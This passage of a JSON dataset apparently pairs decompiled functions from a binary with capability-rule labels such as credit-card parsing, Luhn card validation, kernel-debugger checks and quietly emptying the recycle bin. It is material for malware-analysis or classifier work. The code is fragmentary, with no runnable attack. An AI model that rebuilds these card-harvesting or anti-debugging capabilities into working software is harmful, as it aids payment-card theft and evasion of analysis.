        "decompiled_code": "\nvoid __cdecl fcn.0001fbb0(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    fcn.00037150(0xb1c5b330, &var_4h, 1);\n    for (var_8h = 0; (var_8h < *0xb1c5b33c && (*(*0xb1c5b340 + var_8h * 8) != arg_8h)); var_8h = var_8h + 1) {\n    }\n    if ((*0xb1c5b33c <= var_8h) &&\n       (iVar1 = fcn.00035260(0xb1c5b340, *0xb1c5b33c << 3, *0xb1c5b33c * 8 + 8),  iVar1 != -1)) {\n        *(*0xb1c5b340 + *0xb1c5b33c * 8) = arg_8h;\n        *(*0xb1c5b340 + 4 + *0xb1c5b33c * 8) = arg_ch;\n        *0xb1c5b33c = *0xb1c5b33c + 1;\n    }\n    fcn.00037180(0xb1c5b330, &var_4h, 1);\n    return;\n}\n",
        "token_count": 330
    },
    "00023520": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00023520(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    \n    if (*0xb1c59554 == -1) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.000226d0(*0xb1c59554, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch);\n    }\n    return uVar1;\n}\n",
        "token_count": 136
    },
    "00023560": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00023560(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    \n    if (*0xb1c59554 == -1) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.00022400(*0xb1c59554, arg_8h, arg_ch, arg_10h, arg_14h);\n    }\n    return uVar1;\n}\n",
        "token_count": 113
    },
    "000235a0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000235a0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    \n    if (*0xb1c59554 == -1) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.00022320(*0xb1c59554, arg_8h, arg_ch, arg_10h, arg_14h);\n    }\n    return uVar1;\n}\n",
        "token_count": 114
    },
    "000235e0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000235e0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    \n    if (*0xb1c59554 == -1) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.00022260(*0xb1c59554, arg_8h, arg_ch, arg_10h, arg_14h);\n    }\n    return uVar1;\n}\n",
        "token_count": 114
    },
    "00023620": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00023620(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    \n    if (*0xb1c59554 == -1) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.000220a0(*0xb1c59554, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch);\n    }\n    return uVar1;\n}\n",
        "token_count": 136
    },
    "00023660": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00023660(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    \n    if (*0xb1c59554 == -1) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.00021f40(*0xb1c59554, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch);\n    }\n    return uVar1;\n}\n",
        "token_count": 136
    },
    "000236a0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.000236a0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint uVar1;\n    \n    if (*0xb1c59554 == -1) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.00021e10(*0xb1c59554, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n    }\n    return uVar1;\n}\n",
        "token_count": 148
    },
    "000236f0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000236f0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    \n    if (*0xb1c59554 == -1) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.00021ad0(*0xb1c59554, arg_8h, arg_ch, arg_10h);\n    }\n    return uVar1;\n}\n",
        "token_count": 104
    },
    "00023720": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00023720(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    \n    if (*0xb1c59554 == -1) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.00021b80(*0xb1c59554, arg_8h, arg_ch);\n    }\n    return uVar1;\n}\n",
        "token_count": 92
    },
    "00023750": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00023750(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    \n    if (*0xb1c59554 == -1) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.00021cb0(*0xb1c59554, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    }\n    return uVar1;\n}\n",
        "token_count": 125
    },
    "00023790": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00023790(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    \n    if (*0xb1c59554 == -1) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.00021900(*0xb1c59554, arg_8h, arg_ch, arg_10h);\n    }\n    return uVar1;\n}\n",
        "token_count": 102
    },
    "000237c0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000237c0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    \n    if (*0xb1c59554 == -1) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.000219e0(*0xb1c59554, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    }\n    return uVar1;\n}\n",
        "token_count": 126
    },
    "00023910": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00023910(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    \n    if (*0xb1c59554 == -1) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.00022790(*0xb1c59554, arg_8h, arg_ch);\n    }\n    return uVar1;\n}\n",
        "token_count": 91
    },
    "00034aa0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00034aa0(uint32_t arg_8h, uint32_t *arg_ch)\n\n{\n    uint uVar1;\n    \n    if ((((arg_8h & 0x80000000) == 0x80000000) && (arg_8h != 0xfffffffe)) && (arg_8h != 0xffffffff)) {\n        *arg_ch = arg_8h;\n        *arg_ch = arg_8h;\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = fcn.000786a6(0xffffffff, arg_8h, 0xffffffff, arg_ch, 0, 0x200, 2);\n    }\n    return uVar1;\n}\n",
        "token_count": 162
    },
    "00035c20": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00035c20(uint arg_8h, uint *arg_ch)\n\n{\n    uint uVar1;\n    \n    *arg_ch = 0;\n    arg_ch[1] = 0;\n    arg_ch[2] = 0;\n    arg_ch[3] = 0;\n    arg_ch[4] = 0;\n    arg_ch[5] = 0;\n    arg_ch[6] = 0;\n    arg_ch[7] = 0;\n    arg_ch[8] = 0;\n    uVar1 = fcn.00035930(arg_8h);\n    arg_ch[5] = uVar1;\n    if (arg_ch[5] == -1) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 189
    },
    "00035c70": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00035c70(uint arg_8h, uint *arg_ch)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00035ae0(arg_8h, 0);\n    if (arg_8h_00 == -1) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        *arg_ch = 0;\n        arg_ch[1] = 0;\n        arg_ch[2] = 0;\n        arg_ch[3] = 0;\n        arg_ch[4] = 0;\n        arg_ch[5] = 0;\n        arg_ch[6] = 0;\n        arg_ch[7] = 0;\n        arg_ch[8] = 0;\n        uVar1 = fcn.00035930(arg_8h_00);\n        arg_ch[5] = uVar1;\n        fcn.00035b40(arg_8h_00);\n        if (arg_ch[5] == -1) {\n            uVar1 = 0xffffffff;\n        }\n        else {\n            uVar1 = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 277
    },
    "00050dc0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00050dc0(int32_t arg_8h, uint arg_ch, uint arg_10h, uint *arg_14h, int32_t arg_18h, uint arg_1ch, int32_t arg_20h, \n            int32_t arg_24h)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    int16_t iVar3;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint *var_ch;\n    int32_t var_8h;\n    code *var_4h;\n    \n    if (*0xb1c463bc != -1) {\n        var_8h = *(arg_8h + *0xb1c463bc);\n        var_4h = *(var_8h + 0x174);\n        if (arg_20h == arg_24h) {\n            cVar2 = fcn.0004f1b0(var_8h, 0, arg_14h, arg_18h, arg_1ch, arg_24h, 0);\n            if (cVar2 != '\\0') {\n                (*var_4h)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h);\n            }\n        }\n        else {\n            cVar2 = fcn.0004f1b0(var_8h, 0, arg_14h, arg_18h, arg_1ch, arg_20h, 1);\n            if (cVar2 == '\\0') {\n                if (arg_18h == 0xe) {\n                    var_ch = arg_14h;\n                    iVar1 = *(arg_14h + 3);\n                    iVar3 = fcn.000354c0(0x800);\n                    if (iVar1 == iVar3) {\n                        var_1ch = *var_ch;\n                        var_18h = var_ch[1];\n                        var_14h = var_ch[2];\n                        var_10h._0_2_ = *(var_ch + 3);\n                        var_10h._0_2_ = fcn.000354c0(0x7ff);\n                        (*var_4h)(arg_8h, arg_ch, arg_10h, &var_1ch, 0xe, arg_1ch, arg_20h, arg_24h);\n                    }\n                }\n            }\n            else {\n                (*var_4h)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 624
    },
    "00050f10": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00050f10(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t var_8h;\n    uint var_4h;\n    \n    if (*0xb1c463bc == 0xffffffff) {\n        for (var_8h = 0; var_8h < 0x400; var_8h = var_8h + 1) {\n            if (*(arg_8h + var_8h) == arg_ch) {\n                *0xb1c463bc = var_8h;\n                break;\n            }\n        }\n        if (*0xb1c463bc == 0xffffffff) {\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 162
    },
    "00060830": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00060830(code **arg_8h)\n\n{\n    uint32_t var_4h;\n    \n    if (*(arg_8h + 1) == *(arg_8h + 5)) {\n        var_4h = *(arg_8h + 6);\n        if (var_4h == 0) {\n            var_4h = (**arg_8h)(arg_8h);\n            if (var_4h != 0xffffffff) {\n                *(arg_8h + 5) = *(arg_8h + 5) + '\\x01';\n                *(arg_8h + 1) = *(arg_8h + 5);\n                *(arg_8h + *(arg_8h + 5) + 0x112) = var_4h;\n                goto code_r0x000608d1;\n            }\n        }\n        *(arg_8h + 0x40) = 1;\n        *(arg_8h + 6) = 1;\n        var_4h = var_4h & 0xffffff00;\n    }\n    else {\n        *(arg_8h + 1) = *(arg_8h + 1) + '\\x01';\n        var_4h = *(arg_8h + *(arg_8h + 1) + 0x112);\ncode_r0x000608d1:\n        *(arg_8h + *(arg_8h + 3) + 0x212) = var_4h;\n        *(arg_8h + 3) = *(arg_8h + 3) + '\\x01';\n        var_4h = arg_8h & 0xffffff00 | var_4h & 0xff;\n    }\n    return var_4h;\n}\n",
        "token_count": 407
    },
    "00078160": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00078160(int32_t arg_8h, uint arg_ch, int32_t *arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t var_5h;\n    \n    var_5h._0_1_ = '\\0';\n    (**0xb1bde0cc)(&var_18h, 0, 0);\n    *(arg_8h + 0x2c) = &var_18h;\n    *(arg_8h + 0x28) = arg_10h;\n    if (arg_14h != -1) {\n        iVar1 = *(arg_8h + 0x60);\n        var_1ch = iVar1 + -0x24;\n        *(iVar1 + -8) = 0xb1c452c0;\n        *(iVar1 + -4) = &var_18h;\n        *(iVar1 + -0x21) = 0;\n        *(iVar1 + -0x21) = 0x40;\n        *(iVar1 + -0x21) = *(iVar1 + -0x21) | 0x80;\n        *(iVar1 + -0x21) = *(iVar1 + -0x21) | 0x20;\n    }\n    *NULL = (**0xb1bde290)();\n    if (*NULL == 0x103) {\n        if (arg_14h == -1) {\n            (**0xb1bde30c)(&var_18h, 0, 0, 0, 0);\n        }\n        else {\n            _var_28h = fcn.00078778(arg_14h, arg_14h >> 0x1f, 0xffffd8f0, 0xffffffff);\n            iVar1 = (**0xb1bde30c)(&var_18h, 0, 0, 0, &var_28h);\n            if (iVar1 == 0x102) {\n                var_5h._0_1_ = '\\x01';\n                (**0xb1bde234)(arg_8h);\n                (**0xb1bde30c)(&var_18h, 0, 0, 0, 0);\n            }\n        }\n    }\n    if (arg_14h != -1) {\n        (**0xb1bde2ec)();\n    }\n    if (stack0xfffffff8 == 0x103) {\n        unique0x00007a00 = *arg_10h;\n    }\n    if (var_5h != '\\0') {\n        stack0xfffffff8 = 0x102;\n    }\n    return stack0xfffffff8;\n}\n",
        "token_count": 640
    },
    "000206c0": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Switch with 1 destination removed at 0x000206e5\n\nuint __cdecl fcn.000206c0(int32_t arg_8h)\n\n{\n    uint var_10h;\n    \n    if (7 < arg_8h - 2U) {\n        return 1;\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    halt_baddata();\n}\n",
        "token_count": 98
    },
    "00017a30": {
        "rules": [
            "parse credit card information/3266979fad224c5386fccfb7f2b301b7"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Switch with 1 destination removed at 0x00017a6b\n\nuint __cdecl fcn.00017a30(int32_t arg_8h, uint noname_1, uint arg_10h)\n\n{\n    uint var_22ch;\n    \n    if (0x25 < arg_8h - 1U) {\n        return arg_10h;\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    halt_baddata();\n}\n",
        "token_count": 115
    },
    "00060ec0": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00060ec0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    \n    *(arg_8h + 0x98) = *(arg_8h + 0x112 + *(arg_8h + 4)) * 0x20 + -0x4e3b9b48;\n    if (*(arg_8h + 0x112 + *(arg_8h + 4)) == -0x70) {\n        if ((*(arg_8h + 0x8c) != '@') || ((*(arg_8h + 0x101) & 1) == 0)) {\n            if (*(arg_8h + 0x106) == '\\0') {\n                *(arg_8h + 0x98) = 0xb1c57a38;\n            }\n            else {\n                *(arg_8h + 0x98) = 0xb1c57a58;\n                *(arg_8h + 0x106) = 0;\n            }\n        }\n    }\n    else if ((*(arg_8h + 0x8c) == '@') && (**(arg_8h + 0x98) == 0xf)) {\n        *(arg_8h + 0x98) = 0xb1c57a78;\n    }\n    else if (**(arg_8h + 0x98) == 0x216) {\n        iVar1 = *(*(arg_8h + 0x98) + 0x1c);\n        uVar3 = fcn.00060930(arg_8h);\n        *(arg_8h + 0x98) = ((uVar3 & 0xff) >> 3 & 7U) * 0x20 + *(iVar1 * 0x10 + -0x4e3ad0e8);\n    }\n    else if (**(arg_8h + 0x98) == 0x21f) {\n        uVar2 = fcn.00060930(arg_8h);\n        if (uVar2 < 0xc0) {\n            uVar2 = *(arg_8h + 0x112 + *(arg_8h + 4));\n            uVar3 = fcn.00060930(arg_8h);\n            *(arg_8h + 0x98) = ((uVar3 & 0xff) >> 3 & 7U) * 0x20 + *(uVar2 * 4 + -0x4e3a8988);\n        }\n        else {\n            uVar2 = *(arg_8h + 0x112 + *(arg_8h + 4));\n            uVar3 = fcn.00060930(arg_8h);\n            *(arg_8h + 0x98) = ((uVar3 & 0xff) - 0xc0) * 0x20 + *(uVar2 * 4 + -0x4e3a8968);\n            fcn.00060830(arg_8h);\n        }\n    }\n    return;\n}\n",
        "token_count": 698
    },
    "0005e8c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Switch with 1 destination removed at 0x0005e8f3 : 61 cases all go to same destination\n\nuint __cdecl fcn.0005e8c0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.0005e1e0(arg_8h, arg_ch);\n    if (0x3c < iVar1 - 4U) {\n        return 0;\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    halt_baddata();\n}\n",
        "token_count": 142
    },
    "0004dc20": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0004dc20(int16_t *arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint var_ch;\n    int32_t var_8h;\n    int16_t *var_4h;\n    \n    var_4h = arg_8h;\n    var_8h = 0;\n    while( true ) {\n        if (5 < var_8h) {\n            return 1;\n        }\n        uVar1 = fcn.00035f40(var_4h, &var_4h, 0x10);\n        if (0xff < uVar1) break;\n        if (var_8h < 5) {\n            if ((*var_4h != 0x2d) && (*var_4h != 0x3a)) {\n                return 0;\n            }\n            var_4h = var_4h + 1;\n        }\n        else if (*var_4h != 0) {\n            return 0;\n        }\n        *(arg_ch + var_8h) = uVar1;\n        var_8h = var_8h + 1;\n    }\n    return 0;\n}\n",
        "token_count": 264
    },
    "000202d0": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000202d0(uint noname_0, uint noname_1, int32_t arg_10h)\n\n{\n    return (arg_10h + 7U & 0xfffffff8) + 1;\n}\n",
        "token_count": 57
    },
    "0005e1e0": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Switch with 1 destination removed at 0x0005e202\n\nint32_t __cdecl fcn.0005e1e0(uint noname_0, int32_t arg_ch)\n\n{\n    uint var_4h;\n    \n    if (6 < arg_ch - 1U) {\n        return arg_ch;\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    halt_baddata();\n}\n",
        "token_count": 104
    },
    "0006e630": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0006e630(int32_t arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    uint uVar1;\n    \n    if (arg_ch == 6) {\n        if (arg_14h == 0xc) {\n            fcn.0007877e(arg_8h + 0xec, arg_10h, 0xc);\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = 0x21590064;\n        }\n    }\n    else {\n        uVar1 = fcn.00074cb0(*(arg_8h + 0xc), arg_ch, arg_10h, arg_14h, 0);\n    }\n    return uVar1;\n}\n",
        "token_count": 175
    },
    "000342e0": {
        "rules": [
            "search for credit card data/212a26c2b8d740cd9f6579dba482d653",
            "parse credit card information/92c3fd9898ba41b4bad3ffb6188f4688"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.000342e0(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t var_120h;\n    uint var_11ch;\n    uint var_118h;\n    int32_t var_114h;\n    uint var_110h;\n    uint var_e5h;\n    uint var_e1h;\n    uint var_d3h;\n    char acStack211 [32];\n    char acStack179 [163];\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_114h = 0;\n    fcn.00078790(&var_110h, 0x80, 0xff);\n    for (var_ch = 0x41; var_ch < 0x5b; var_ch = var_ch + 1) {\n        *(&var_110h + var_ch) = var_ch + -0x41;\n    }\n    for (var_ch = 0x61; var_ch < 0x7b; var_ch = var_ch + 1) {\n        *(&var_110h + var_ch) = var_ch + -0x47;\n    }\n    for (var_ch = 0x30; var_ch < 0x3a; var_ch = var_ch + 1) {\n        *(&var_110h + var_ch) = var_ch + '\\x04';\n    }\n    var_e5h._0_1_ = 0x3e;\n    var_e1h._0_1_ = 0x3f;\n    var_d3h._0_1_ = 0;\n    uVar1 = arg_10h & 0x80000003;\n    if (uVar1 < 0) {\n        uVar1 = (uVar1 - 1 | 0xfffffffc) + 1;\n    }\n    if (uVar1 == 0) {\n        for (var_ch = 0; var_ch < arg_10h; var_ch = var_ch + 4) {\n            var_4h = arg_8h + var_ch;\n            for (var_8h = 0; var_8h < 4; var_8h = var_8h + 1) {\n                *(&var_118h + var_8h) = *(&var_110h + *(var_4h + var_8h));\n            }\n            var_11ch._0_1_ = var_118h << 2 | var_118h._1_1_ >> 4;\n            var_11ch._1_1_ = var_118h._1_1_ << 4 | var_118h._2_1_ >> 2;\n            var_11ch._2_1_ = var_118h._2_1_ << 6 | var_118h._3_1_;\n            if (*(var_4h + 2) == '=') {\n                var_120h = 1;\n            }\n            else {\n                var_120h = (*(var_4h + 3) != '=') + 2;\n            }\n            var_8h = var_120h;\n            fcn.0007877e(arg_ch + var_114h, &var_11ch, var_120h);\n            var_114h = var_114h + var_8h;\n        }\n        *(arg_ch + var_114h) = 0;\n    }\n    else {\n        var_114h = -1;\n    }\n    return var_114h;\n}\n",
        "token_count": 810
    },
    "0005e9c0": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0005e9c0(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    \n    if ((arg_ch < 0x26) || (0x2d < arg_ch)) {\n        arg_ch = arg_ch - 0x1e;\n    }\n    else {\n        arg_ch = arg_ch - 0x26 | (*(arg_8h + 0x101) & 1) << 3;\n    }\n    if (*(arg_8h + 0x10b) == '\\x10') {\n        iVar1 = arg_ch + 0x15;\n    }\n    else if ((*(arg_8h + 0x8c) == ' ') ||\n            (((*(arg_8h + 0x10b) == ' ' && ((*(arg_8h + 0x101) & 0xf) >> 3 == 0)) && (*(arg_8h + 0x10a) == '\\0')))) {\n        iVar1 = arg_ch + 0x25;\n    }\n    else {\n        iVar1 = arg_ch + 0x35;\n    }\n    return iVar1;\n}\n",
        "token_count": 263
    },
    "000670a0": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000670a0(int32_t arg_8h, uint arg_ch, uint arg_10h, uint32_t arg_14h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_4h;\n    \n    if ((arg_14h & 1) == 0) {\n        fcn.00034550(arg_8h + 0x18);\n    }\n    else {\n        iVar1 = fcn.00034570(arg_8h + 0x18);\n        if (iVar1 == 0) {\n            return 0x21590002;\n        }\n    }\n    uVar2 = fcn.00067160(arg_8h, arg_ch, arg_10h, 0, 0, 0, 0);\n    fcn.000345c0(arg_8h + 0x18);\n    return uVar2;\n}\n",
        "token_count": 201
    },
    "0002dee0": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002dee0(uint noname_0, uint noname_1, uint noname_2, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint var_30h;\n    uint *var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint *var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint *var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    *arg_14h = 3;\n    var_14h = fcn.00029470(1, 0);\n    var_20h = 5;\n    var_1ch = 2;\n    var_28h = 0;\n    var_24h = 0;\n    var_2ch = &var_14h;\n    var_30h = 4;\n    var_18h = &var_30h;\n    var_10h = 1;\n    var_ch = &var_20h;\n    var_8h = 1;\n    var_4h = &var_18h;\n    fcn.0002ee00(&var_10h, arg_18h, arg_1ch);\n    return;\n}\n",
        "token_count": 301
    },
    "0002b2e0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0002b2e0(int32_t arg_8h, char *arg_ch)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t arg_10h;\n    uint *arg_ch_00;\n    uint var_10ch;\n    uint var_108h;\n    \n    if ((((*arg_ch == '\\\\') && (arg_ch[1] == '\\\\')) && (arg_ch[2] == '.')) && (arg_ch[3] == '\\\\')) {\n        fcn.00020a20(&var_108h, 0x104, 0xb1be1628, arg_ch + 4);\n    }\n    else if (((*arg_ch == '\\\\') && (arg_ch[1] == '?')) && ((arg_ch[2] == '?' && (arg_ch[3] == '\\\\')))) {\n        fcn.00020a20(&var_108h, 0x104, 0xb1be1630, arg_ch);\n    }\n    else {\n        fcn.00020a20(&var_108h, 0x104, 0xb1be1628, arg_ch);\n    }\n    *(arg_8h + 0x118) = 1;\n    arg_10h = arg_8h + 4;\n    arg_ch_00 = &var_108h;\n    uVar1 = fcn.00066c80();\n    uVar1 = fcn.0005d250(uVar1, arg_ch_00, arg_10h);\n    uVar2 = fcn.00066c80();\n    *(arg_8h + 0x11c) = uVar2;\n    return uVar1;\n}\n",
        "token_count": 373
    },
    "00072a10": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
